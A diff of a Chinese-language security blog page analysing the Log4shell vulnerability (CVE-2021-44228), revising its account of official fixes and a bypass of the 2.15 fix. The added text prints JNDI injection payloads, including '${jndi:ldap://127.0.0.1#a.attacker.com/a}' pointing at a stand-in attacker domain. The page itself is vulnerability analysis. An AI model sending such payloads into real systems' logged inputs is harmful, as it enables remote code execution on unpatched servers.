@@ -13,7 +13,7 @@
 <meta property="og:site_name" content="Math &amp; Sec ，HACHp1的个人博客">
 <meta property="og:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
 <meta property="og:image" content="http://159.75.52.53/img/thumbnails/planet_red.png">
-<meta property="og:updated_time" content="2022-03-09T03:27:50.129Z">
+<meta property="og:updated_time" content="2022-03-09T06:30:17.601Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Log4shell（CVE-2021-44228）调试分析">
 <meta name="twitter:description" content="Log4shell（CVE-2021-44228）调试分析   Log4shell（CVE-2021-44228）调试分析  漏洞背景 环境安装 漏洞触发 漏洞跟踪过程 总结 根本原因和官方修复手段 参考资料">
@@ -305,7 +305,8 @@
 <ul>
 <li>Log4j 2的日志格式化功能提供了一系列lookup的功能，支持<code>${}</code>语法，能够方便地获取系统信息等（可见<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution" target="_blank" rel="external">Configuration</a>以及 <a href="https://logging.apache.org/log4j/2.x/manual/lookups.html" target="_blank" rel="external">Lookups</a> 。这些功能中包括一个Jndi Lookup的功能，该功能能够通过日志调用Jndi，是漏洞的关键，造成攻击者能够以<code>${jndi:ldap://xxx.xxx/x}</code>的形式调用JNDI。</li>
 <li>官方给出的临时解决方法：直接删除Jndi类： &gt; Otherwise, in any release other than 2.16.0, you may remove the <code>JndiLookup</code> class from the classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code></li>
-<li>修复1：<a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3" target="_blank" rel="external">Restrict LDAP access via JNDI (#608)</a>，该修复中限制了LDAP的目标服务器和可用的类，并且对JNDI的可用协议进行了限制</li>
+<li>修复1（对于2.10&lt;=,&lt;2.15的版本）：增加了默认设置不使用lookup功能，但这种情况仅适用于直接使用形如<code>logger.info(Untrusted_message)</code>的形式，而有的开发者需要获取和记录诸如User-agent的信息，此时必须执行变量的<code>put</code>操作并对log4j的模板（log4j2.properties文件中的设置）进行渲染，仍然会导致lookup的发生。</li>
+<li>修复2（2.15版本）：<a href="https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3" target="_blank" rel="external">Restrict LDAP access via JNDI (#608)</a>，该修复中增加了默认设置不使用lookup功能（与修复1相同）。此外还限制了LDAP的目标服务器（仅支持127的ip）和可用的类，并且对JNDI的可用协议进行了限制。但是由于对127的检测有可以绕过的方法，使用诸如<code>${jndi:ldap://127.0.0.1#a.attacker.com/a}</code>形式的payload便可以绕过（该地址虽然不合法，但攻击者可以在自己的DNS中加入该域名，同样会执行成功）</li>
 <li>在最新版中，该功能仅支持<code>java:</code>和无协议，不支持LDAP协议</li>
 </ul>
 <h2 id="参考资料">参考资料</h2>
